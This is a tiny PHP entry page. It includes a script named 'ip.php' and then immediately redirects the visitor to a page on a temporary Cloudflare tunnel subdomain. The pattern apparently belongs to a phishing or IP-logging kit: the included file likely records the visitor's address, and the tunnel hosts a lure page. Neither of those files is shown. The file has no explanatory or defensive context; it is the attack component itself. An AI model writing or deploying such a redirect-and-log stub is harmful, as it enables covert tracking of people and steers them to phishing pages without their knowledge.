<?php
include 'ip.php';
header('Location: https://snapshot-slope-criminal-robert.trycloudflare.com/index2.html');
exit
?>
